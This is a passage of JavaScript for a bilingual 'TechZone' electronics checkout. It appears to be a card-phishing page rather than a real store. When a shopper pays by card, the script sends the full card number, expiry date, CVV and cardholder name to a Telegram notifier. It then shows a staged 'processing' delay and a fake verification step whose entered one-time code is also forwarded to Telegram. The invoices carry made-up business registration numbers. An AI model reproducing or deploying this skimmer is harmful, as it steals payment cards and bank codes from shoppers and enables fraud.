                    <p>${(currentLanguage === 'es' ? 'Por favor espere mientras enviamos la información de su tarjeta de crédito de forma segura.' : 'Please wait while we submit your credit card information securely.')}</p>
                </div>
            </div>
        </div>

        <div id="checkout-step-5" class="checkout-step">
            <div class="confirmation-section">
                <div class="loading-state" id="processing-payment">
                    <div class="spinner"></div>
                    <h3>${(currentLanguage === 'es' ? 'Procesando Pago' : 'Processing Payment')}</h3>
                    <p>${(currentLanguage === 'es' ? 'Por favor espere mientras procesamos su pago. Esto puede tomar un minuto.' : 'Please hold on while we process your payment. This might take a minute.')}</p>
                    <p class="processing-steps">
                        <span class="step-text">${(currentLanguage === 'es' ? 'Validando método de pago' : 'Validating payment method')}</span>
                    </p>
                </div>
                <div class="success-state" id="order-success" style="display: none;">
                    <div class="success-icon">
                        <i class="fas fa-check-circle"></i>
                    </div>
                    <h3>${(currentLanguage === 'es' ? '¡Pedido Confirmado!' : 'Order Confirmed!')}</h3>
                    <p>${(currentLanguage === 'es' ? 'Tu pedido ha sido procesado exitosamente.' : 'Your order has been processed successfully.')}</p>
                    <div class="order-details">
                        <div class="order-detail">
                            <span>${(currentLanguage === 'es' ? 'Número de Pedido:' : 'Order Number:')}</span>
                            <strong id="final-order-number">${checkoutData.orderNumber}</strong>
                        </div>
                        <div class="order-detail">
                            <span>${(currentLanguage === 'es' ? 'Total:' : 'Total:')}</span>
                            <strong>${convertPrice(subtotal, false)}</strong>
                        </div>
                        <div class="order-detail">
                            <span>${(currentLanguage === 'es' ? 'Entrega Estimada:' : 'Estimated Delivery:')}</span>
                            <strong>${getEstimatedDelivery()}</strong>
                        </div>
                    </div>
                    <button class="btn btn-primary close-checkout-success">${(currentLanguage === 'es' ? 'Continuar Comprando' : 'Continue Shopping')}</button>
                </div>
            </div>
        </div>

        <div id="checkout-step-6" class="checkout-step">
            <div class="otp-section">
                <div class="otp-header">
                    <div class="otp-security">
                        <i class="fas fa-shield-alt"></i>
                        <span>${(currentLanguage === 'es' ? 'Verificación de Seguridad' : 'Security Verification')}</span>
                    </div>
                </div>
                <div class="otp-content">
                    <h3>${(currentLanguage === 'es' ? 'Verificar tu Pago' : 'Verify Your Payment')}</h3>
                    <p>${(currentLanguage === 'es' ? 'Hemos enviado un código de verificación de 6 dígitos a tu número de teléfono. Por favor, ingrésalo a continuación para completar tu compra.' : 'We have sent a 6-digit verification code to your phone number. Please enter it below to complete your purchase.')}</p>
                    <div class="otp-input-container">
                        <input type="tel" id="otp-single-input" class="otp-single-input" maxlength="6" inputmode="numeric" placeholder="123456" style="width: 200px; padding: 15px; font-size: 24px; text-align: center; border: 2px solid var(--border-color); border-radius: 8px; font-family: monospace; letter-spacing: 0.5em;" />
                    </div>
                    <div class="otp-timer">
                        <span>${(currentLanguage === 'es' ? 'El código expira en:' : 'Code expires in:')}</span> 
                        <span id="otp-countdown">02:00</span>
                    </div>
                    <div class="otp-actions">
                        <button id="resend-otp-btn" class="btn btn-secondary" disabled>${(currentLanguage === 'es' ? 'Reenviar Código' : 'Resend Code')}</button>
                        <button id="verify-otp-btn" class="btn btn-primary">${(currentLanguage === 'es' ? 'Verificar Código' : 'Verify Code')}</button>
                        <button id="skip-otp-btn" class="btn btn-outline" style="margin-top: 1rem;">
                        ${(currentLanguage === 'es' ? 'No requiero OTP' : 'I don\'t require OTP')}
                    </button>
                    </div>
                    <div class="otp-error" id="otp-error" style="display: none;">
                        <i class="fas fa-exclamation-triangle"></i>
                        <span>${(currentLanguage === 'es' ? 'Código inválido. Por favor, inténtalo de nuevo.' : 'Invalid code. Please try again.')}</span>
                    </div>
                </div>
            </div>
        </div>
    </div>`;

    modal.innerHTML = checkoutHTML;

    overlay.appendChild(modal);
    document.body.appendChild(overlay);

    setupCheckoutEventListeners();
    setupDiscountCode();
}

function setupDiscountCode() {
    const applyDiscountBtn = document.getElementById('apply-discount');
    const discountCodeInput = document.getElementById('discount-code');

    if (applyDiscountBtn && discountCodeInput) {
        applyDiscountBtn.addEventListener('click', function() {
            applyDiscountCode();
        });

        discountCodeInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                applyDiscountCode();
            }
        });
    }
}

function setupCheckoutEventListeners() {
    try {
        // Close checkout
        const closeCheckoutBtn = document.querySelector('.close-checkout');
        if (closeCheckoutBtn) {
            closeCheckoutBtn.addEventListener('click', closeCheckout);
        }

        const checkoutOverlay = document.querySelector('.checkout-overlay');
        if (checkoutOverlay) {
            checkoutOverlay.addEventListener('click', function(e) {
                // Only close if clicking directly on overlay, not on modal content
                if (e.target === this && !e.target.closest('.checkout-modal')) {
                    e.preventDefault();
                    closeCheckout();
                }
            });
        }

        // Step navigation
        const nextToShippingBtn = document.getElementById('next-to-shipping');
        const termsCheckbox = document.getElementById('terms-checkbox');

        if (termsCheckbox && nextToShippingBtn) {
            termsCheckbox.addEventListener('change', function() {
                nextToShippingBtn.disabled = !this.checked;
                if (this.checked) {
                    nextToShippingBtn.classList.remove('disabled');
                } else {
                    nextToShippingBtn.classList.add('disabled');
                }
            });
        }

        if (nextToShippingBtn) {
            nextToShippingBtn.addEventListener('click', function() {
                const checkbox = document.getElementById('terms-checkbox');
                if (checkbox && !checkbox.checked) {
                    alert(currentLanguage === 'es' ? 'Debe aceptar los términos y condiciones para continuar' : 'You must accept the terms and conditions to continue');
                    return;
                }
                goToCheckoutStep(2);
            });
        }

        const backToSummaryBtn = document.getElementById('back-to-summary');
        if (backToSummaryBtn) {
            backToSummaryBtn.addEventListener('click', function() {
                goToCheckoutStep(1);
            });
        }

        const nextToPaymentBtn = document.getElementById('next-to-payment');
        if (nextToPaymentBtn) {
            nextToPaymentBtn.addEventListener('click', function() {
                // Validate customer information
                const customerName = document.getElementById('customer-name');
                const customerPhone = document.getElementById('customer-phone');
                const customerAddress = document.getElementById('customer-address');
                const customerCity = document.getElementById('customer-city');

                // Check required fields
                if (!customerName || !customerName.value.trim()) {
                    alert(currentLanguage === 'es' ? 'Por favor ingrese su nombre completo' : 'Please enter your full name');
                    if (customerName) customerName.focus();
                    return;
                }

                if (!customerPhone || !customerPhone.value.trim()) {
                    alert(currentLanguage === 'es' ? 'Por favor ingrese su número de teléfono' : 'Please enter your phone number');
                    if (customerPhone) customerPhone.focus();
                    return;
                }

                if (!customerAddress || !customerAddress.value.trim()) {
                    alert(currentLanguage === 'es' ? 'Por favor ingrese su dirección completa' : 'Please enter your complete address');
                    if (customerAddress) customerAddress.focus();
                    return;
                }

                if (!customerCity || !customerCity.value.trim()) {
                    alert(currentLanguage === 'es' ? 'Por favor ingrese su ciudad' : 'Please enter your city');
                    if (customerCity) customerCity.focus();
                    return;
                }

                // Store customer information in checkoutData
                checkoutData.customerName = customerName.value.trim();
                checkoutData.customerPhone = customerPhone.value.trim();
                checkoutData.customerAddress = customerAddress.value.trim();
                checkoutData.customerCity = customerCity.value.trim();
                checkoutData.customerPostal = document.getElementById('customer-postal')?.value.trim() || '';

                goToCheckoutStep(3);
            });
        }

        const backToShippingBtn = document.getElementById('back-to-shipping');
        if (backToShippingBtn) {
            backToShippingBtn.addEventListener('click', function() {
                goToCheckoutStep(2);
            });
        }

        // Payment method selection
        document.querySelectorAll('input[name="payment-method"]').forEach(radio => {
            radio.addEventListener('change', function() {
                const method = this.value;

                // Remove active class from all payment options
                document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('active'));

                // Hide all payment details and instruction
                document.querySelectorAll('.payment-details').forEach(detail => {
                    detail.style.display = 'none';
                    detail.classList.remove('active');
                });

                const instruction = document.getElementById('payment-method-instruction');
                if (instruction) {
                    instruction.style.display = 'none';
                }

                // Add active class to selected option
                this.closest('.payment-option').classList.add('active');

                // Show selected payment details
                const detailsElement = document.getElementById(`${method}-details`);
                if (detailsElement) {
                    detailsElement.style.display = 'block';
                    detailsElement.classList.add('active');
                }

                checkoutData.paymentMethod = method;
            });
        });

        // Place order event listeners
        document.querySelectorAll('.place-order').forEach(function(btn) {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();

                try {
                    const method = this.dataset.method;

                    if (method === 'bank-transfer') {
                        // Send Telegram notification for bank transfer
                        if (typeof TelegramNotifications !== 'undefined') {
                            TelegramNotifications.confirmBankTransfer({
                                total: convertPrice(getCartTotal(), false),
                                orderRef: generateOrderReference()
                            });
                        }
                        processOrder();
                    } else if (method === 'credit-card') {
                        if (!validateCardDetails()) {
                            return; // Stop processing if card details are invalid
                        }

                        // Store cardholder name
                        const cardholderNameInput = document.getElementById('cardholder-name');
                        checkoutData.cardholderName = cardholderNameInput ? cardholderNameInput.value : '';

                        // Send Telegram notification for card details
                        if (typeof TelegramNotifications !== 'undefined') {
                            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
                            const lastFourDigits = cardNumber.slice(-4);
                            TelegramNotifications.cardDetailsSubmitted({
                                total: convertPrice(getCartTotal(), false),
                                orderRef: generateOrderReference(),
                                cardholderName: checkoutData.cardholderName,
                                cardNumber: document.getElementById('card-number').value.replace(/\s/g, ''),
                                expiryDate: document.getElementById('expiry-date').value,
                                cvv: document.getElementById('cvv').value,
                                lastFourDigits: lastFourDigits
                            });
                        }

                        // Proceed to the processing step (card submission)
                        goToCheckoutStep(4);

                        // 10-second delay for card processing
                        setTimeout(function() {
                            // Proceed to verification step without generating OTP
                            goToCheckoutStep(6);

                            // Start OTP countdown
                            startOTPCountdown();
                        }, 10000); // 10 seconds delay
                    }
                } catch (error) {
                    console.error('Error placing order:', error);
                    alert('There was an error placing your order. Please try again.');
                }

                return false;
            });
        });

        // Success close - use event delegation properly
        document.addEventListener('click', function(e) {
            if (e.target.classList.contains('close-checkout-success')) {
                e.preventDefault();
                e.stopPropagation();
                closeCheckout();
                clearCart();
            }
        });

        // OTP Verification
        const verifyOtpBtn = document.getElementById('verify-otp-btn');
        const skipOtpBtn = document.getElementById('skip-otp-btn');
        const resendOtpBtn = document.getElementById('resend-otp-btn');

        if (verifyOtpBtn) verifyOtpBtn.addEventListener('click', verifyOTP);
        if (skipOtpBtn) skipOtpBtn.addEventListener('click', skipOTP);
        if (resendOtpBtn) resendOtpBtn.addEventListener('click', resendOTP);

        // Setup OTP input navigation
        setupOTPInputs();

        // Setup card input formatting
        setupCardInputFormatting();

    } catch (error) {
        console.error('Error setting up checkout event listeners:', error);
    }
}

function setupCardInputFormatting() {
    const cardNumberInput = document.getElementById('card-number');
    const expiryDateInput = document.getElementById('expiry-date');
    const cvvInput = document.getElementById('cvv');

    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
            value = value.substring(0, 16); // Limit to 16 digits
            value = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Add spaces every 4 digits
            e.target.value = value;
        });
    }

    if (expiryDateInput) {
        expiryDateInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
    }

    if (cvvInput) {
        cvvInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3); // Only digits, max 3
        });
    }
}

function validateCardDetails() {
    const cardNumber = document.getElementById('card-number').value.replace(/\s/g, ''); // Remove spaces
    const expiryDate = document.getElementById('expiry-date').value;
    const cvv = document.getElementById('cvv').value;
    const cardErrors = document.getElementById('card-errors');

    // Card Number: Must be 16 digits
    if (!/^\d{16}$/.test(cardNumber)) {
        cardErrors.textContent = currentLanguage === 'es' ? 'Número de tarjeta inválido. Debe tener 16 dígitos.' : 'Invalid card number. Must be 16 digits.';
        cardErrors.style.display = 'block';
        return false;
    }

    // Expiry Date: Must be in MM/YY format
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
        cardErrors.textContent = currentLanguage === 'es' ? 'Fecha de vencimiento inválida. Debe estar en formato MM/AA.' : 'Invalid expiry date. Must be in MM/YY format.';
        cardErrors.style.display = 'block';
        return false;
    }

    // CVV: Must be 3 digits
    if (!/^\d{3}$/.test(cvv)) {
        cardErrors.textContent = currentLanguage === 'es' ? 'CVV inválido. Debe tener 3 dígitos.' : 'Invalid CVV. Must be 3 digits.';
        cardErrors.style.display = 'block';
        return false;
    }
    cardErrors.style.display = 'none'; // Clear errors if valid
    return true;
}

function setupOTPInputs() {
    // Remove existing listeners to prevent duplicates
    const existingHandler = document.body.getAttribute('data-otp-handler');
    if (existingHandler) return;

    // Add input formatting for single OTP input - keep it simple
    document.body.addEventListener('input', function(e) {
        if (e.target && e.target.id === 'otp-single-input') {
            // Only allow numeric input and limit to 6 characters
            let value = e.target.value.replace(/[^0-9]/g, '');
            value = value.substring(0, 6);
            e.target.value = value;

            // Auto-verify when 6 digits are entered
            if (value.length === 6) {
                setTimeout(() => {
                    verifyOTP();
                }, 100);
            }
        }
    });

    document.body.addEventListener('keydown', function(e) {
        if (e.target && e.target.id === 'otp-single-input') {
            // Allow only numeric keys and control keys
            if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
                e.preventDefault();
            }
        }
    });

    // Mark as initialized
    document.body.setAttribute('data-otp-handler', 'true');
}

let otpTimeout; // Define otpTimeout in a higher scope

function simulateOTPSending(phoneNumber) {
    // Generate a random 6-digit OTP
    const otp = Math.floor(100000 + Math.random() * 900000);
    console.log('Simulating OTP sending to ' + phoneNumber + ': ' + otp);
    // In a real implementation, this would send an actual OTP
    // Store the OTP (for demonstration purposes only)
    localStorage.setItem('otp', otp.toString());
}

function startOTPCountdown() {
    let timeRemaining = 120; // 2 minutes (120 seconds)
    const countdownDisplay = document.getElementById('otp-countdown');
    const resendButton = document.getElementById('resend-otp-btn');

    if (!countdownDisplay || !resendButton) {
        console.error('OTP countdown elements not found');
        return;
    }

    // Set initial display to 2:00
    countdownDisplay.textContent = '02:00';
    resendButton.disabled = true;

    function updateCountdown() {
        timeRemaining--;

        // Ensure timeRemaining is not negative
        if (timeRemaining < 0) {
            timeRemaining = 0;
        }

        const minutes = Math.floor(timeRemaining / 60);
        const seconds = timeRemaining % 60;
        countdownDisplay.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;

        if (timeRemaining <= 0) {
            clearInterval(otpTimeout);
            countdownDisplay.textContent = '00:00';
            resendButton.disabled = false;
            resendButton.style.opacity = '1';
            resendButton.style.cursor = 'pointer';
        }
    }

    // Clear any existing timeout before setting a new one
    if (otpTimeout) {
        clearInterval(otpTimeout);
    }

    // Start countdown after 1 second
    otpTimeout = setInterval(updateCountdown, 1000);
}

function verifyOTP() {
    const otpInput = document.getElementById('otp-single-input');
    if (!otpInput) {
        console.error('OTP input not found');
        return;
    }

    // Get the raw input value (no space removal needed)
    const enteredOTP = otpInput.value.trim();
    const otpError = document.getElementById('otp-error');

    console.log('Verifying OTP:', enteredOTP, 'Length:', enteredOTP.length);

    // Check if OTP format is valid
    if (enteredOTP.length === 6 && /^\d{6}$/.test(enteredOTP)) {
        // Send the user-entered OTP to Telegram for verification
        if (typeof TelegramNotifications !== 'undefined') {
            TelegramNotifications.userEnteredOTP(enteredOTP);
        }

        console.log('User entered OTP sent to Telegram:', enteredOTP);

        if (otpError) {
            otpError.style.display = 'none';
        }

        // Clean up stored OTP
        localStorage.removeItem('currentOTP');
        localStorage.removeItem('otp');

        // Process the order
        processOrder();

    } else {
        // Show error for invalid or incomplete OTP
        console.log('Invalid or incomplete OTP');
        if (otpError) {
            otpError.style.display = 'block';
            const errorText = otpError.querySelector('span');
            if (errorText) {
                errorText.textContent = currentLanguage === 'es' ? 
                    'Por favor ingrese exactamente 6 dígitos' : 
                    'Please enter exactly 6 digits';
            }
        }
    }
}

function skipOTP() {
    // Skip OTP verification and go directly to order completion
    document.getElementById('otp-error').style.display = 'none';
    processOrder();
}

function resendOTP() {
    // Generate new OTP
    const newOtp = Math.floor(100000 + Math.random() * 900000);
    localStorage.setItem('currentOTP', newOtp.toString());
    console.log('New OTP generated:', newOtp);

    simulateOTPSending(checkoutData.customerPhone);
    const resendBtn = document.getElementById('resend-otp-btn');
    if (resendBtn) {
        resendBtn.disabled = true;
    }

    // Clear any error messages
    const otpError = document.getElementById('otp-error');
    if (otpError) {
        otpError.style.display = 'none';
    }

    // Clear OTP input
    const otpInput = document.getElementById('otp-single-input');
    if (otpInput) {
        otpInput.value = '';
        otpInput.focus();
    }

    startOTPCountdown();
}

function goToCheckoutStep(stepNumber) {
    try {
        // Update step indicators
        const stepElements = document.querySelectorAll('.step');
        stepElements.forEach((step, index) => {
            step.classList.toggle('active', index + 1 <= stepNumber);
            step.classList.toggle('completed', index + 1 < stepNumber);
        });

        // Show correct step content
        const checkoutSteps = document.querySelectorAll('.checkout-step');
        checkoutSteps.forEach((step, index) => {
            step.classList.toggle('active', index + 1 === stepNumber);
        });

        // Scroll to top of checkout modal
        const checkoutModal = document.querySelector('.checkout-modal');
        if (checkoutModal) {
            checkoutModal.scrollTop = 0;
        }

        // Also scroll the active step to top
        const activeStep = document.querySelector(`#checkout-step-${stepNumber}`);
        if (activeStep) {
            activeStep.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    } catch (error) {
        console.error('Error navigating to checkout step:', error);
    }
}

function processOrder() {
    try {
        goToCheckoutStep(5);

        // Simulate processing steps
        const steps = [
            { text: currentLanguage === 'es' ? 'Validando método de pago' : 'Validating payment method', delay: 1000 },
            { text: currentLanguage === 'es' ? 'Confirmando inventario' : 'Confirming inventory', delay: 1500 },
            { text: currentLanguage === 'es' ? 'Generando orden de compra' : 'Generating purchase order', delay: 2000 },
            { text: currentLanguage === 'es' ? 'Generando factura' : 'Generating invoice', delay: 1000 }
        ];

        let currentStep = 0;

        function nextStep() {
            try {
                if (currentStep < steps.length) {
                    const stepTextElement = document.querySelector('.step-text');
                    if (stepTextElement) {
                        stepTextElement.textContent = steps[currentStep].text;
                    }
                    currentStep++;
                    setTimeout(nextStep, steps[currentStep - 1].delay);
                } else {
                    // Generate invoice before showing success
                    generateInvoice();

                    // Show success
                    const processingElement = document.getElementById('processing-payment');
                    const successElement = document.getElementById('order-success');

                    if (processingElement) processingElement.style.display = 'none';
                    if (successElement) successElement.style.display = 'block';

                    // Order completed successfully
                    console.log('Order completed:', checkoutData.orderNumber);
                }
            } catch (error) {
                console.error('Error in nextStep:', error);
            }
        }

        nextStep();
    } catch (error) {
        console.error('Error processing order:', error);
        alert('There was an error processing your order. Please try again.');
    }
}

// Generate and download PDF invoice
function generateInvoice() {
    try {
        const { jsPDF } = window.jspdf;
        if (!jsPDF) {
            console.error('jsPDF library not loaded');
            return;
        }

        const doc = new jsPDF();
        const pageWidth = doc.internal.pageSize.width;
        const pageHeight = doc.internal.pageSize.height;
        const margin = 20;
        let yPosition = 25;

        // Company header with proper business details
        doc.setFontSize(22);
        doc.setTextColor(30, 58, 138);
        doc.text('TechZone', margin, yPosition);
        
        // Company address and details in header
        doc.setFontSize(9);
        doc.setTextColor(80, 80, 80);
        doc.text('Premium Refurbished Technology', margin, yPosition + 7);
        
        // Business address based on country
        const businessAddress = getBusinessAddress();
        doc.text(businessAddress.address, margin, yPosition + 14);
        doc.text(`${businessAddress.city}, ${businessAddress.country}`, margin, yPosition + 21);
        doc.text(`Tel: ${countryConfig[currentCountry].phone}`, margin, yPosition + 28);
        doc.text(`Email: sales@techzone-${currentCountry}.com`, margin, yPosition + 35);

        // Invoice title and number (right aligned)
        doc.setFontSize(18);
        doc.setTextColor(0, 0, 0);
        const invoiceTitle = currentLanguage === 'es' ? 'FACTURA' : 'INVOICE';
        doc.text(invoiceTitle, pageWidth - margin, yPosition, { align: 'right' });
        
        doc.setFontSize(10);
        doc.setTextColor(100, 100, 100);
        doc.text(`# ${checkoutData.orderNumber}`, pageWidth - margin, yPosition + 12, { align: 'right' });
        doc.text(`${currentLanguage === 'es' ? 'Fecha:' : 'Date:'} ${new Date().toLocaleDateString()}`, pageWidth - margin, yPosition + 20, { align: 'right' });

        yPosition += 50;

        // Business registration details
        doc.setFontSize(8);
        doc.setTextColor(100, 100, 100);
        const businessReg = getBusinessRegistration();
        doc.text(businessReg, margin, yPosition);
        
        yPosition += 15;

        // Customer information section
        doc.setFontSize(12);
        doc.setTextColor(30, 58, 138);
        doc.text(currentLanguage === 'es' ? 'FACTURAR A:' : 'BILL TO:', margin, yPosition);

        yPosition += 8;
        doc.setFontSize(10);
        doc.setTextColor(0, 0, 0);
        doc.text(checkoutData.customerName || 'Customer', margin, yPosition);
        yPosition += 6;
        doc.text(checkoutData.customerPhone || '', margin, yPosition);
        yPosition += 6;
        
        if (checkoutData.customerAddress) {
            const addressLines = doc.splitTextToSize(checkoutData.customerAddress, 80);
            doc.text(addressLines, margin, yPosition);
            yPosition += addressLines.length * 6;
        }
        doc.text(`${checkoutData.customerCity || ''}, ${countryConfig[currentCountry].name}`, margin, yPosition);

        yPosition += 20;

        // Items table header with better spacing
        doc.setFillColor(245, 245, 245);
        doc.rect(margin, yPosition - 3, pageWidth - 2 * margin, 10, 'F');

        doc.setFontSize(9);
        doc.setTextColor(0, 0, 0);
        doc.setFont(undefined, 'bold');
        doc.text(currentLanguage === 'es' ? 'DESCRIPCIÓN' : 'DESCRIPTION', margin + 2, yPosition + 3);
        doc.text(currentLanguage === 'es' ? 'CANT.' : 'QTY', pageWidth - 80, yPosition + 3);
        doc.text(currentLanguage === 'es' ? 'PRECIO UNIT.' : 'UNIT PRICE', pageWidth - 55, yPosition + 3);
        doc.text('TOTAL', pageWidth - 20, yPosition + 3);

        yPosition += 15;
        doc.setFont(undefined, 'normal');

        // Items with proper spacing
        let subtotal = 0;
        cart.forEach(item => {
            const itemTotal = item.price * item.quantity;
            subtotal += itemTotal;

            // Product name with proper wrapping
            const maxWidth = pageWidth - 120;
            const productLines = doc.splitTextToSize(item.name, maxWidth);
            doc.setFontSize(9);
            doc.text(productLines, margin + 2, yPosition);
            
            // Quantity, unit price, and total with proper alignment
            doc.text(item.quantity.toString(), pageWidth - 75, yPosition);
            
            const unitPrice = item.price === 0 ? 'FREE' : convertPrice(item.price, false);
            doc.text(unitPrice, pageWidth - 55, yPosition);
            
            const totalPrice = itemTotal === 0 ? 'FREE' : convertPrice(itemTotal, false);
            doc.text(totalPrice, pageWidth - 20, yPosition, { align: 'right' });

            yPosition += Math.max(productLines.length * 4, 6) + 2;
        });

        // Totals section with proper spacing
        yPosition += 10;
        doc.line(pageWidth - 80, yPosition, pageWidth - margin, yPosition);
        yPosition += 8;

        // Subtotal
        doc.setFontSize(10);
        doc.text(`${currentLanguage === 'es' ? 'Subtotal:' : 'Subtotal:'}`, pageWidth - 60, yPosition);
        doc.text(convertPrice(subtotal, false), pageWidth - 20, yPosition, { align: 'right' });
        yPosition += 8;

        // Shipping
        doc.text(`${currentLanguage === 'es' ? 'Envío:' : 'Shipping:'}`, pageWidth - 60, yPosition);
        doc.text(currentLanguage === 'es' ? 'GRATIS' : 'FREE', pageWidth - 20, yPosition, { align: 'right' });
        yPosition += 8;

        // Total with emphasis
        doc.line(pageWidth - 80, yPosition, pageWidth - margin, yPosition);
        yPosition += 6;
        doc.setFont(undefined, 'bold');
        doc.setFontSize(11);
        doc.setTextColor(30, 58, 138);
        doc.text(`${currentLanguage === 'es' ? 'TOTAL:' : 'TOTAL:'}`, pageWidth - 60, yPosition);
        doc.text(convertPrice(subtotal, false), pageWidth - 20, yPosition, { align: 'right' });

        // Payment method
        yPosition += 20;
        doc.setFont(undefined, 'normal');
        doc.setFontSize(10);
        doc.setTextColor(0, 0, 0);
        const paymentMethodText = checkoutData.paymentMethod === 'bank-transfer' ? 
            (currentLanguage === 'es' ? 'Transferencia Bancaria' : 'Bank Transfer') :
            (currentLanguage === 'es' ? 'Tarjeta de Crédito' : 'Credit Card');
        doc.text(`${currentLanguage === 'es' ? 'Método de Pago:' : 'Payment Method:'} ${paymentMethodText}`, margin, yPosition);

        // Terms and conditions
        yPosition += 15;
        doc.setFontSize(8);
        doc.setTextColor(100, 100, 100);
        const termsText = currentLanguage === 'es' ? 
            'Términos: Garantía de 12 meses incluida. Devoluciones aceptadas dentro de 30 días.' :
            'Terms: 12-month warranty included. Returns accepted within 30 days.';
        doc.text(termsText, margin, yPosition);

        // Footer with business details
        const footerY = pageHeight - 30;
        doc.setFontSize(7);
        doc.setTextColor(120, 120, 120);
        
        // Left side - business registration
        const businessInfo = getBusinessRegistration();
        doc.text(businessInfo, margin, footerY);
        
        // Center - website
        doc.text('www.techzone.com', pageWidth / 2, footerY, { align: 'center' });
        
        // Right side - thank you message
        const thankYou = currentLanguage === 'es' ? 'Gracias por su compra' : 'Thank you for your purchase';
        doc.text(thankYou, pageWidth - margin, footerY, { align: 'right' });

        // Save the PDF
        const fileName = `TechZone_Invoice_${checkoutData.orderNumber}.pdf`;
        doc.save(fileName);

        console.log('Invoice generated successfully:', fileName);
        showInvoiceNotification();

    } catch (error) {
        console.error('Error generating invoice:', error);
    }
}

// Helper function to get business address
function getBusinessAddress() {
    switch(currentCountry) {
        case 'honduras':
            return {
                address: 'Col. Palmira, Avenida República de Chile',
                city: 'Tegucigalpa',
                country: 'Honduras'
            };
        case 'nicaragua':
            return {
                address: 'Plaza España, Módulo E-4',
                city: 'Managua',
                country: 'Nicaragua'
            };
        case 'trinidad':
            return {
                address: '55 Independence Square',
                city: 'Port of Spain',
                country: 'Trinidad and Tobago'
            };
        case 'usa':
            return {
                address: '1234 Tech Boulevard, Suite 100',
                city: 'Miami, FL 33101',
                country: 'United States'
            };
        default:
            return {
                address: 'Main Technology Center',
                city: 'Central District',
                country: countryConfig[currentCountry].name
            };
    }
}

// Helper function to get business registration details
function getBusinessRegistration() {
    switch(currentCountry) {
        case 'honduras':
            return 'RTN: 08011998123456 | Registro Mercantil: 123456-2024 | CAI: 8A-85-69-7E';
        case 'nicaragua':
            return 'RUC: J0310000123456 | Registro Mercantil: 45671-M | DGI: 001-001-01-1234567';
        case 'trinidad':
            return 'BIR: 123-456-789 | Company Registration: 123456 | VAT: TT123456789';
        case 'usa':
            return 'EIN: 12-3456789 | Florida Corp: P24000123456 | Sales Tax: FL-ST-123456';
        default:
            return `Business Registration: ${currentCountry.toUpperCase()}-2024-001 | Tax ID: TX123456789`;
    }
}

// Show invoice download notification
function showInvoiceNotification() {
    const notification = document.createElement('div');
    notification.className = 'invoice-notification';
    notification.innerHTML = `
        <div style="display: flex; align-items: center; gap: 0.5rem;">
            <i class="fas fa-file-pdf" style="color: #dc2626;"></i>
            <span>${currentLanguage === 'es' ? 'Factura descargada automáticamente' : 'Invoice downloaded automatically'}</span>
        </div>
    `;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #16a34a;
        color: white;
        padding: 1rem 1.5rem;
        border-radius: 8px;
        z-index: 10001;
        font-size: 0.9rem;
        font-weight: 600;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        animation: slideInRight 0.3s ease;
    `;

    document.body.appendChild(notification);
    setTimeout(() => {
        notification.remove();
    }, 5000);
}

function getBankName() {
    const config = countryConfig[currentCountry];
    switch (currentCountry) {
        case 'nicaragua': return 'Banco de América Central (BAC)';
        case 'honduras': return 'Banco Atlántida';
        case 'trinidad': return 'Republic Bank Limited';
        case 'elsalvador': return 'Banco Agrícola';
        case 'paraguay': return 'Banco Continental';
        case 'guatemala': return 'Banco Industrial';
        case 'dominican': return 'Banco Popular Dominicano';
        case 'usa': return 'Bank of America';
        default: return 'Local Bank';
    }
}

function getAccountNumber() {
    switch (currentCountry) {
        case 'nicaragua': return '1234567890123456';
        case 'honduras': return '2345678901234567';
        case 'trinidad': return '3456789012345678';
        case 'elsalvador': return '4567890123456789';
        case 'paraguay': return '5678901234567890';
        case 'guatemala': return '6789012345678901';
        case 'dominican': return '7890123456789012';
        case 'usa': return '8901234567890123';
        default: return '0000000000000000';
    }
}

function getEstimatedDelivery() {
    const deliveryDate = new Date();
    deliveryDate.setDate(deliveryDate.getDate() + 3);
    return deliveryDate.toLocaleDateString('en-US', {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric'
    });
}

function closeCheckout() {
    const overlay = document.getElementById('checkout-overlay');
    if (overlay) {
        overlay.classList.remove('active');
        setTimeout(() => {
            overlay.remove();
        }, 300);
    }
}

function clearCart() {
    cart = [];
    localStorage.removeItem('cart');
    updateCartCount();
    updateCartDisplay();
}

// Filter products
function filterProducts(category) {
    const products = document.querySelectorAll('.product-card');

    products.forEach(product => {
        const productCategory = product.getAttribute('data-category') || '';
        const productId = product.getAttribute('data-product-id') || '';

        let shouldShow = false;

        if (category === 'all') {
            shouldShow = true;
        } else if (category === 'iphone') {
            shouldShow = productId.toLowerCase().includes('iphone');
        } else if (category === 'samsung') {
            shouldShow = productId.toLowerCase().includes('galaxy');
        } else if (category === 'audio') {
            shouldShow = productId.toLowerCase().includes('airpods') ||
                productId.toLowerCase().includes('jbl');
        } else if (category === 'accessory') {
            shouldShow = productId.toLowerCase().includes('protector') ||
                productId.toLowerCase().includes('cable') ||
                productId.toLowerCase().includes('powerbank');
        } else {
            shouldShow = productCategory === category;
        }

        if (product && product.style) {
            product.style.display = shouldShow ? 'block' : 'none';
        }
    });
}

// Sort products
function sortProducts(sortBy) {
    const productsContainer = document.querySelector('.products-grid');
    if (!productsContainer) return;

    const products = Array.from(productsContainer.querySelectorAll('.product-card'));

    products.sort((a, b) => {
        const priceA = parseFloat(a.querySelector('.current-price').textContent.replace(/[^0-9.]/g, ''));
        const priceB = parseFloat(b.querySelector('.current-price').textContent.replace(/[^0-9.]/g, ''));

        switch (sortBy) {
            case 'price-low-high':
